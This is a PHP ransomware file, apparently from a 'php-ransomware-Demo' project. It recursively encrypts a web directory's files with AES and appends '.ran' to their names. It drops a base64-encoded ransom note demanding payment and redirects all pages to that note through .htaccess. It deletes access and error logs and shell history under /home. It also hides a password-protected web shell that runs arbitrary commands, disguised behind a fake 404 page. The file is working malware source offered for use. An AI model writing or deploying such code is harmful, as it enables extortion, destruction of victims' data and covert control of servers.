<?php
error_reporting(0); //do not display errors
set_time_limit(0); //there is no runtime limit
ini_set('memory_limit', '-1'); //there is no memory limit

//create encryption key
$GLOBALS['method'] = "AES-256-CBC";
$GLOBALS['salt'] = base64_decode("ARIl0edI6SUQJaeK");
//spassword
$passphrase = "07828c41768178cb7bf552550f014df0901499229db0c7c93cbcb24f0feacaae8f97a07cddab2835ac177d69800e0793d4d218d5341e0c04832e59db5a7ca3fa";

$key_length = 256;
$iterations = 1000;
$digest_algorithm = 'SHA512';
$GLOBALS['key'] = openssl_pbkdf2($passphrase, $GLOBALS['salt'], $key_length, $iterations, $digest_algorithm);
$GLOBALS['iv'] = base64_decode("LDJ9WTDRsTcL3uYjJhd2dw");


### EXTENSION Changer ###
function changeExt($ext1){
    rename($ext1, $ext1 . ".ran");
}

### CONTENT Encryption ###
function encryptFile($node){
    //get file content
    $content = file_get_contents($node);

    //encrypt file content
    $encrypted_content = openssl_encrypt($content, $GLOBALS['method'], $GLOBALS['key'], 0, $GLOBALS['iv']);

    //replace original content with encrypted content
    file_put_contents($node, $encrypted_content);

    changeExt($node);
}

### MAIN ENCRYPTION FUNCTION ###
function iterate($root){
    $files = array_diff(scandir($root), array('.', '..'));

    foreach ($files as $file) {
        //don't encrypt the encryption file
        if($file !== basename($_SERVER['SCRIPT_FILENAME'], ".php").".php" && $file!= ' '){
            $path = $root . '/' . $file;
           // echo $path;
            if (is_dir($path)) {
                iterate($path);
                changeExt($path);
            } else {
                encryptFile($path);
            }
        }
    }
}
//iterate("/opt/lampp/htdocs/php-ransomware-Demo/Encrypt");

### RANSOMNOTE FILE CREATION FUNCTION ###
function decryptHere($here){
    $data = base64_decode("PGh0bWw+CjxjZW50ZXI+CiAgICA8Ym9keSBzdHlsZT0iYmFja2dyb3VuZC1jb2xvcjoJY29yYWwgIj4KCQk8ZGl2IGNsYXNzPSJmcm9udC1mb3JtIj4KCQkJPGRpdiBjbGFzcz0ibGF5b3V0Ij4KCQkJCTxoZWFkZXI+CgkJCQkJPGgxIGNsYXNzPSJ0aXRsZSI+SGVyZSBpcyBsYW5kZWQgYnkgUmFuc29td2FyZSA8L2gxPgoJCQkJPC9oZWFkZXI+CgkJCQk8ZGl2IGNsYXNzPSJhYm91dCI+CgkJCQkJPHA+VGhpcyBpcyBhIDxhIGhyZWY9Imh0dHBzOi8vZW4ud2lraXBlZGlhLm9yZy93aWtpL1JhbnNvbXdhcmUiIHRhcmdldD0iX2JsYW5rIiBzdHlsZT0iY29sb3I6IHJlZCI+IFJhbnNvbXdhcmU8L2E+PC9wPgoJCQkJCTxwPkFsbCBvZiB5b3VyIGZpbGVzIGhhdmUgYmVlbiBlbmNyeXB0ZWQgYW5kIGl0IGlzIHVucmVhY2hhYmxlIHdpdGhvdXQgdGhlIGRlY3J5cHRpb24ga2V5ITwvcD4KCQkJCQk8cD5QYXkgJCB0byAjIGFuZCBDb250YWN0IGF0dGFja2VyQHh5ei5jb20gdG8gb2J0YWluIHRoZSBkZWNyeXB0aW9uIGZpbGUgd2l0aCB0aGUgZGVjcnlwdGlvbiBrZXk8L3A+CgkJCQkJPHA+PHN0cm9uZyBzdHlsZT0iY29sb3I6I2JmMGEzMyI+Q0FVVElPVVMhISA8L3N0cm9uZz5JZiB5b3UgYXR0ZW1wdGVkIHRvIGRlY3J5cHQgdGhlIGZpbGVzIHdpdGggdGhlIHdyb25nIGtleSwgZGF0YSBjb3VsZCBiZSBsb3N0ITwvcD4KCQkJCQkKCQkJCTwvZGl2PgoJCQk8L2Rpdj4KCQk8L2Rpdj4KCTwvYm9keT4KCTwvY2VudGVyPgo8L2h0bWw+");
    file_put_contents("index1.php", $data);
}

#---------------------------------------------------------------------------------
### RUN RANSOMWARE ###
if(isset($_POST['encrypt'])){

  iterate("/opt/lampp/htdocs/php-ransomware-Demo/Encrypt");

    

  Decrypthere("/opt/lampp/htdocs/php-ransomware-Demo/Encrypt");

   
    file_put_contents('.htaccess', "DirectoryIndex /index1.php\nErrorDocument 400 /index1.php\nErrorDocument 401 /index1.php\nErrorDocument 403 /index1.php\nErrorDocument 404 /index1.php\nErrorDocument 500 /index1.php\n");

    //clear logs
    clearlogs();

    //self-deletion
    //unlink($_SERVER['SCRIPT_FILENAME']);
}

#---------------------------------------------------------------------------------#


//h3llo(sha2)
if(isset($_GET['auth']) && hash('sha512', $_GET['auth'])=='165d62b557a9c2c65743114b3cfd7a92d6258dcb2c50990b3a6347fd631cc6c0e8321fe5387566067adf3b09896a0e9c7278d40ae9b329adbf185f9dfa43a12f')
{
    //hide error 404
    $flag = 1;
    function error(){
        echo "#error {display:none;}";
    }
    
    //display main page
    echo base64_decode("PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KPGhlYWQ+CiAgICA8bWV0YSBjaGFyc2V0PSJ1dGYtOCI+CiAgICA8bWV0YSBodHRwLWVxdWl2PSJYLVVBLUNvbXBhdGlibGUiIGNvbnRlbnQ9IklFPWVkZ2UiPgogICAgPG1ldGEgbmFtZT0idmlld3BvcnQiIGNvbnRlbnQ9IndpZHRoPWRldmljZS13aWR0aCwgaW5pdGlhbC1zY2FsZT0xIj4KICAgIDx0aXRsZT5SYW5zb20gRGVtb2w8L3RpdGxlPgogICAgPHN0eWxlPgogICAgICAgICogewogICAgICAgICAgICAtd2Via2l0LWJveC1zaXppbmc6IGJvcmRlci1ib3g7CiAgICAgICAgICAgIGJveC1zaXppbmc6IGJvcmRlci1ib3g7CiAgICAgICAgfQoKICAgICAgICBib2R5IHsKICAgICAgICAgICAgZm9udC1mYW1pbHk6IHNhbnMtc2VyaWY7CiAgICAgICAgICAgIGNvbG9yOiByZ2JhKDAsIDAsIDAsIC43NSk7CiAgICAgICAgfQoKICAgICAgICBtYWluIHsKICAgICAgICAgICAgbWFyZ2luOiBhdXRvOwogICAgICAgICAgICBtYXgtd2lkdGg6IDg1MHB4OwogICAgICAgIH0KCiAgICAgICAgcHJlLAogICAgICAgIGlucHV0LAogICAgICAgIGJ1dHRvbiB7CiAgICAgICAgICAgIGJvcmRlci1yYWRpdXM6IDVweDsKICAgICAgICB9CgogICAgICAgIHByZSwKICAgICAgICBpbnB1dCwKICAgICAgICBidXR0b24gewogICAgICAgICAgICBiYWNrZ3JvdW5kLWNvbG9yOiAjZWZlZmVmOwogICAgICAgIH0KCiAgICAgICAgbGFiZWwgewogICAgICAgICAgICBkaXNwbGF5OiBibG9jazsKICAgICAgICB9CgogICAgICAgIGlucHV0IHsKICAgICAgICAgICAgd2lkdGg6IDEwMCU7CiAgICAgICAgICAgIGJhY2tncm91bmQtY29sb3I6ICNlZmVmZWY7CiAgICAgICAgICAgIGJvcmRlcjogMnB4IHNvbGlkIHRyYW5zcGFyZW50OwogICAgICAgIH0KCiAgICAgICAgaW5wdXQ6Zm9jdXMgewogICAgICAgICAgICBvdXRsaW5lOiBub25lOwogICAgICAgICAgICBiYWNrZ3JvdW5kOiB0cmFuc3BhcmVudDsKICAgICAgICAgICAgYm9yZGVyOiAycHggc29saWQgI2U2ZTZlNjsKICAgICAgICB9CgogICAgICAgIGJ1dHRvbiB7CiAgICAgICAgICAgIGJvcmRlcjogbm9uZTsKICAgICAgICAgICAgY3Vyc29yOiBwb2ludGVyOwogICAgICAgICAgICBtYXJnaW4tbGVmdDogNXB4OwogICAgICAgIH0KCiAgICAgICAgYnV0dG9uOmhvdmVyIHsKICAgICAgICAgICAgYmFja2dyb3VuZC1jb2xvcjogI2U2ZTZlNjsKICAgICAgICB9CgogICAgICAgIHByZSwKICAgICAgICBpbnB1dCwKICAgICAgICBidXR0b24gewogICAgICAgICAgICBwYWRkaW5nOiAxMHB4OwogICAgICAgIH0KCiAgICAgICAgLmZvcm0tZ3JvdXAgewogICAgICAgICAgICBkaXNwbGF5OiAtd2Via2l0LWJveDsKICAgICAgICAgICAgZGlzcGxheTogLW1zLWZsZXhib3g7CiAgICAgICAgICAgIGRpc3BsYXk6IGZsZXg7CiAgICAgICAgICAgIHBhZGRpbmc6IDE1cHggMDsKICAgICAgICB9CiAgICA8L3N0eWxlPgoKPC9oZWFkPgo8L2h0bWw+Cgo=");

    checkwhoareu(); 
    webshell(); 
    //display encryption form
    echo base64_decode("PGZvcm0gc3R5bGU9InBhZGRpbmctYm90dG9tOjMwcHgiIG1ldGhvZD0icG9zdCIgYWN0aW9uPSIuL21hbGljaW91cy5waHAiPjxpbnB1dCBuYW1lPSJlbmNyeXB0IiBmb3I9ImVuY3J5cHQiIHR5cGU9InN1Ym1pdCIgaWQ9ImVuY3J5cHQiIHZhbHVlPSJFbmNyeXB0IiBzdHlsZT0iY3Vyc29yOnBvaW50ZXIiPjwvZm9ybT4K");

}

//situational awareness
function checkwhoareu(){
    echo '<strong>OS: </strong>' . PHP_OS . "</br></br>";
   
    echo '<strong>Current Path: </strong>' . getcwd() . "</br></br>";
    echo '<strong>Web Server info: </strong>' . $_SERVER['SERVER_SOFTWARE'] . "</br></br>";
    echo '<strong>php_uname: </strong>' . php_uname() . "</br></br>";
    if(extension_loaded('openssl')){echo ' Yes';}else{echo ' No';} 
    echo "</br></br>";

    //get disabled functions if exist
    $disabled_functions = ini_get('disable_functions');
    if ($disabled_functions!=''){
        $arr = explode(',', $disabled_functions);
        sort($arr);
        echo 'Disabled Functions: ';
        for ($i=0; $i<count($arr); $i++){
            echo ' > '.$arr[$i];
        }
    } else {
        echo '<strong>Disabled Functions: </strong>No functions disabled</br></br>';
    }
}

//execute commands (webshell)
function webshell(){
   
     if (!empty($_POST['cmd'])) {
    $cmd = shell_exec($_POST['cmd']);
}
echo '<body bgcolor="684612">
    <main>
        <h1> Ransomware Demo</h1>
        </br>
        <h3>Web Shell</h3>
        <h2></h2>

        <form method="post">
            <label for="cmd"><strong>Execute a command</strong></label>
            <div class="form-group">
                <input type="text" name="cmd" id="cmd" '.htmlspecialchars($_POST["cmd"], ENT_QUOTES, "UTF-8") . ' autofocus>
                <button type="submit">Execute</button>
            </div>
        </form>';
     if ($_SERVER['REQUEST_METHOD'] === 'POST'){
           echo '<h2>Output</h2>';
            if (isset($cmd)){
              //      echo $cmd;
              echo  '<pre >';
              echo $cmd;
              echo '</pre>';
            }
            else{
               echo '<pre><small>No result.</small></pre>';
            }
        }
       echo " </main></body>";
       echo "</br>";
}
   




//clear errors from logs
function clearlogs(){
    command("find /home -name 'error_log'  -exec rm {} \;");
    command("find /home -name 'access.log'  -exec rm {} \;");
    command("find /home -name 'history' -exec rm {} \;");
}

//try executing OS commands using system(),exec(),shell_exec(), or passthru()
function command($commnd){
    if(function_exists("system")){
        system($commnd). "\n";
    }
    elseif(function_exists("exec")){
        exec($commnd). "\n";
    }
    elseif(function_exists("shell_exec")){
        shell_exec($commnd). "\n";
    }
    elseif(function_exists("passthru")){
        passthru($commnd);
    }
}

?>

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><style><?php if($flag==1){error();} ?></style><body>
<div id="error">
<h1>Not Found</h1>
<p>We can’t connect to the server.</p>
<hr>
<address><?php echo $_SERVER['SERVER_SOFTWARE']; ?></address>
</div>
<div id="error"> 
    <form style="padding-bottom:30px" method="post" action="./index1.php"><input name="encrypt" for="encrypt" type="submit" id="encrypt" value="Click here" style="cursor:pointer"></form>
</div>

</body></html>